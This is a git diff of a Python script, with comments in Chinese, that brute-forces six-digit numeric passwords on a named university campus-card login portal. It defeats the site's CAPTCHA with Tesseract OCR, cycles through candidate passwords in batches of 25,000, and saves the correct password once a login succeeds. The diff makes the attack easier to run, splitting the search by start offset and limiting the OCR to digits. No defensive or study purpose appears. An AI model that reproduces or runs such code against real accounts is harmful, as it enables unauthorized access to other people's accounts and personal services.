@@ -1,14 +1,14 @@
-import requests
 import base64
 import json
-import time
-from PIL import Image
+import random
 import pytesseract
+import requests
+from PIL import Image
 
 # 这里填Tesseract-OCR目录把C:\\Program Files (x86)\\Tesseract-OCR改成你的路径
 testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
-#这里填你的学号
-xh = ''
+valicode = random.choices(range(0, 100000))[0]
+valicode_name = 'imgs//' + str(valicode) + '.jpg'
 
 session = requests.session()
 login_url = 'http://ykt.jsu.edu.cn/Login/LoginBySnoQuery'
@@ -16,20 +16,22 @@ index_url = 'http://ykt.jsu.edu.cn/'
 img_url = 'http://ykt.jsu.edu.cn/Login/GetValidateCode?time=1541822935426'
 user_url = 'http://ykt.jsu.edu.cn/User/User'
 
+
 def get_valicode():
-    name = 'valicode.jpg'
+    name = valicode_name
     img = session.get(url=img_url)
-    with open(name,'wb') as f:
+    with open(name, 'wb') as f:
         f.write(img.content)
     img = Image.open(name)
     # testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
-    valicode = pytesseract.image_to_string(img, lang='amt', config=testdata_dir_config)
+    valicode = pytesseract.image_to_string(img, lang='nums', config=testdata_dir_config).replace(' ', '')
     return valicode
+
 
 def login(password):
     data = {
-        #
-        'sno': xh,
+         #下面要改成你的学号
+        'sno': '在这里输入学号',
         'pwd': base64.b64encode(str(password).encode('utf-8')).decode('utf-8'),
         'ValiCode': get_valicode(),
         'remember': '1',
@@ -46,40 +48,45 @@ def login(password):
         'Referer': 'http://ykt.jsu.edu.cn/',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'X-Requested-With': 'XMLHttpRequest',
-        'Content-Length':'81',
+        'Content-Length': '81',
         'Connection': 'keep-alive',
         'Pragma': 'no-cache',
         'Cache-Control': 'no-cache',
     }
-    IsSucceed = json.loads(session.post(url=login_url,data=data,headers = header).text)
-    if IsSucceed['IsSucceed'] == True :
+    IsSucceed = json.loads(session.post(url=login_url, data=data, headers=header).text)
+    if IsSucceed['IsSucceed'] == True:
         print("登陆成功")
         return 1
-    else :
+    else:
         if IsSucceed['Msg'] == '验证码错误':
             print("验证码错误")
             return 0
         else:
-            print(IsSucceed['Msg']+" 错误")
+            print(IsSucceed['Msg'] + " 错误")
             # 账户密码错误
             return 2
+
+
 def gvalicode(i):
     img = session.get(url=img_url)
-    with open('img/'+i+'.jpg','wb') as f:
+    with open('img/' + i + '.jpg', 'wb') as f:
         f.write(img.content)
 
+
 def run():
-    start = time.time()
-    for x in range(0, 999999):
+    begin = int(input("请输入开始序号（开始+25000）："))
+    print("%06d-%06d" %(begin,begin+25000))
+    for x in range(begin, begin + 25000):
+        x = str('%06d' % x)
         print(x)
-        with open('已遍历.txt', 'a+') as f:
-            f.write(str(x) + "\n")
+        with open(str(begin) + '-' + str(begin + 25000) + '.txt', 'a+') as f:
+            f.write(x + "\n")
         temp = 0
         while True:
             a = login(x)
             if a == 1:
                 with open('password.txt', 'w') as f:
-                    f.write(str(x))
+                    f.write(x)
                 print("完成")
                 temp = 1
                 break
@@ -89,9 +96,7 @@ def run():
                 continue
         if temp == 1:
             break
-    end = time.time()
-    print(end - start)
+
 
 if __name__ == '__main__':
-
     run()
